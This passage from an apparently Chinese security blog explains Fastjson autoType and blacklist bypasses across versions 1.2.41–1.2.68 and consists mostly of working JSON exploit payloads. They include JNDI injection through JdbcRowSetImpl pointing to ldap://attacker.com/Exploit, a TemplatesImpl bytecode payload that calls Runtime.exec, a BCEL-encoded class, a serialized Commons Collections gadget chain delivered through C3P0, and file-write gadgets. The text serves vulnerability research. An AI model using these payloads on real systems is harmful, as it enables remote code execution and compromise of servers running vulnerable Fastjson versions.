<p><strong>缓存加载流程</strong>：</p>
<ol>
<li><strong>反序列化处理</strong>：Fastjson 使用 <code>MiscCodec</code> 反序列化器处理 <code>java.lang.Class</code> 类型。</li>
<li>**调用 <code>TypeUtils.loadClass</code>**：解析 <code>val</code> 值对应的类名，并将该类加载到 <code>mappings</code> 缓存中（<code>cache=true</code> 时默认缓存）。</li>
<li><strong>缓存写入</strong>：此时 <code>com.sun.rowset.JdbcRowSetImpl</code> 被存入全局缓存 <code>TypeUtils.mappings</code>，后续可直接读取。</li>
</ol>
<ul>
<li>之后的PoC逻辑就和之前一样了，将之前的逻辑结合起来，PoC如下。</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250401174351333.png?x-oss-process=style/img-to-webp" alt="image-20250401174351333"></p>
<ul>
<li><p><strong>其他利用缓存绕过原理类似</strong></p>
<ul>
<li>Templateslmpl</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;yv66vgAAADQALQoABgAfCgAgACEIACIKACAAIwcAJAcAJQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAqTGNvbS9zaGlyby92dWxuL2Zhc3Rqc29uL1RlbXBsYXRlc0ltcGxjbWQ7AQAKRXhjZXB0aW9ucwcAJgEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBABBNZXRob2RQYXJhbWV0ZXJzAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACcBAApTb3VyY2VGaWxlAQAVVGVtcGxhdGVzSW1wbGNtZC5qYXZhDAAHAAgHACgMACkAKgEABGNhbGMMACsALAEAKGNvbS9zaGlyby92dWxuL2Zhc3Rqc29uL1RlbXBsYXRlc0ltcGxjbWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAPAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIAAAABABYAFwADABgAAAANAwASAAAAFAAAABYAAAABABAAGQADAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAEgALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABoAGwACAA4AAAAEAAEAHAAYAAAACQIAEgAAABoAAAABAB0AAAACAB4=&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aaa&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>BCEL</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$c1N$C1$Q$7d$F$d9$b2$x$I$82$m$a2$a8$e8A$f0$A$Xo$Q$_F$T$p$8a$91$N$c6$e3R$h$5c$c4$5d$b2$y$ca$ly$e6$a2F$T$bd$fbQ$c6$e9$c6$m$J$3dt$3ao$de$7b$9dN$bf$7f$de$3f$B$i$60$d7$80$8e$b4$81$Vd$a2$c8$aa$b8$ca$91$e3X3$a0$n$cf$b1$ce$b1$c1$a0$d5m$c7$f6$P$Z$c2$a5r$9ba$e1$c8$bd$95$M$89$86$ed$c8$8b$d1CGz$a6$d5$e9$T$S$ad$8b$fe$l3$de$f2$zq$7fn$N$82$Sy2$Y$zw$e4$Jyb$x$aafVz$d6$a3$V$83$81E$8eB$M$9b$d8$o$Da$f5EE$8ee$M$db$u2$a4$V$a7j$bb$d5$d3$e6$f1X$c8$81o$bb$OC$3e$40$fb$96$d3$ad$5e$8d$i$df$7e$90$d3$a2$f2$dba$60$sC$f2$9f$d5$ec$f4$a4$f0$Z$96$e7$84$d4UW$fa$d3$qS$w7$e685z1$b5$q$Y$f6J3$d5$96$ef$d9N$b76$x$b8$f4$5c$n$87C$S$e4f$99$e6$9d$e7$3e$a91$d4$cam$U$R$a5$91$ab$V$CS$af$a7$3dFY$81$o$a3$Y$d9$7f$F$9b$d0$81fH$bb$W$80a$S$zM$a9$s$e5$K$5d$7dC$u$V$7e$c1$c2$f53$e2g$l$d0nH$cb$bf$sAQ$tj$84$eeP$sY$3a$v$x$3d$409a$f4$d9tw$82P$8eP$83$p$a9$93h9h$w$f5$LT$ffu$95$j$C$A$A&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">:</span><span class="string">&quot;bbb&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>C3P0 二次反序列化 CC1</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;userOverridesAsString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HexAsciiSerializedMap:ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737200316F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E5472616E73666F726D65644D617061773FE05DF15A700300024C000E6B65795472616E73666F726D657274002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B4C001076616C75655472616E73666F726D657271007E00057870707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000047372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65707400096765744D6574686F64757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001A7371007E00117571007E0016000000027070740006696E766F6B657571007E001A00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00167371007E00117571007E00160000000174000463616C63740004657865637571007E001A0000000171007E001D737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C7708000000100000000174000576616C75657400047979797978787672001B6A6176612E6C616E672E616E6E6F746174696F6E2E54617267657400000000000000000000007870;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>总结</strong></p>
<ul>
<li>利用默认的MiscCodec反序列化器去反序列化加载java.lang.Class，然后通过设置val值，将我们要执行的恶意类提前通过TypeUtils.loadClass方法提前加载到mappings中，这样当我们再次去反序列化调用com.sun.rowset.JdbcRowSetImpl，并在checkAutoType方法中进行检测时，会在mapping中去查找，由于我们的提前注入，就会绕过黑白名单检测直接返回我们想要执行的恶意类。</li>
<li>由于该利用是在黑白名单和autoType检测之前就已经返回了，因此不需要目标服务器手动开启autoType支持，并且在1.2.25-1.2.47版本之间的其他绕过例如L;、LL;;、[，绕过黑名单都需要autoType手动开启后才能利用，否则无法利用。</li>
</ul>
</li>
</ul>
<h2 id="3-2-1-2-41-L-绕过"><a href="#3-2-1-2-41-L-绕过" class="headerlink" title="3.2. 1.2.41 L&lt;类名&gt;;  绕过"></a>3.2. 1.2.41 L&lt;类名&gt;;  绕过</h2><ul>
<li>在1.2.41版本中在未开启autoType支持时，仅支持利用白名单过滤，白名单优先，因此无法争对黑名单进行绕过。</li>
<li>因此在1.2.25-1.2.47争对黑名单绕过都需要开启autoType支持。</li>
<li>利用在TypeUtiles.loadClass方法中删除L和;的机制进行黑名单绕过。</li>
<li>com.alibaba.fastjson.util.TypeUtils.loadClass</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>构造PoC为</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://attacker.com/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="3-3-1-2-42-双写LL-绕过"><a href="#3-3-1-2-42-双写LL-绕过" class="headerlink" title="3.3. 1.2.42 双写LL&lt;类名&gt;;; 绕过"></a>3.3. 1.2.42 双写LL&lt;类名&gt;;; 绕过</h2><ul>
<li>com.alibaba.fastjson.util.TypeUtils.loadClass</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 递归去除类名中的&quot;L&quot;和&quot;;&quot;</span></span><br><span class="line"><span class="keyword">while</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>构造PoC</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>, <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://attacker.com/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-4-1-2-43-绕过"><a href="#3-4-1-2-43-绕过" class="headerlink" title="3.4. 1.2.43 [&lt;类名&gt; 绕过"></a>3.4. 1.2.43 [&lt;类名&gt; 绕过</h2><ul>
<li>com.alibaba.fastjson.util.TypeUtils.loadClass</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>构造PoC</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://attacker.com/Exploit&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-5-1-2-68-绕过"><a href="#3-5-1-2-68-绕过" class="headerlink" title="3.5. 1.2.68 绕过"></a>3.5. 1.2.68 绕过</h2><h3 id="3-5-1-当未主动开启autoType支持"><a href="#3-5-1-当未主动开启autoType支持" class="headerlink" title="3.5.1.当未主动开启autoType支持"></a>3.5.1.当未主动开启autoType支持</h3><ul>
<li><p>当未主动开启autotype支持时，想要实现利用必须仅在默认配置的白名单中进行反序列利用，否则会被拦截从而无法利用。</p>
</li>
<li><p>以下是一些是部分白名单，所有想要绕过autoType是比较有难度的事情，不过也并不是完全没有办法。</p>
</li>
<li><p><strong>基本类型包装类</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Boolean</span><br><span class="line">java.lang.Integer</span><br><span class="line">java.lang.Long</span><br><span class="line">java.lang.Double</span><br><span class="line">java.lang.String</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>集合接口</strong>（仅限接口，非实现类）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.util.List</span><br><span class="line">java.util.Map</span><br><span class="line">java.util.Collection</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>日期类</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.util.Date</span><br><span class="line">java.sql.Date</span><br><span class="line">java.sql.Time</span><br><span class="line">java.sql.Timestamp</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>JSON 结构类</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.JSONObject</span><br><span class="line">com.alibaba.fastjson.JSONArray</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>JDK 内置序列化接口</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Cloneable</span><br><span class="line">java.lang.Comparable</span><br><span class="line">java.lang.Runnable</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="1-利用JDK11写文件"><a href="#1-利用JDK11写文件" class="headerlink" title="1.利用JDK11写文件"></a>1.利用JDK11写文件</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;infl&quot;</span><span class="punctuation">:</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;array&quot;</span><span class="punctuation">:</span><span class="string">&quot;eJwrLE8tAgAEaQHA&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;limit&quot;</span><span class="punctuation">:</span><span class="number">22</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bufLen&quot;</span><span class="punctuation">:</span><span class="number">1048576</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;protocolVersion&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-利用commons-io写文件"><a href="#2-利用commons-io写文件" class="headerlink" title="2.利用commons-io写文件"></a>2.利用commons-io写文件</h4><ul>
<li>文件大小需要8kb以上才能正确写入，且commons-io在2.0-2.6</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 